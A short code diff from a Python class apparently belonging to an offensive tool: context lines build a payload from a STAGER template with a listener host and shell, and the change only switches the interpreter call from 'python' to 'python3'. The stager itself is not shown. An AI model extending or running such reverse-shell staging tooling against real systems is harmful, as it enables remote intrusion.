@@ -32,7 +32,7 @@ class Environ:
             payload = STAGER.format(lhost, shell)
 
             try:
-                p = subprocess.Popen(["python {}".format(file)], shell=True, stdout=subprocess.PIPE)
+                p = subprocess.Popen(["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE)
                 p.communicate()
             except OSError as e:
                 print(colors("[!] Process Error", 91))
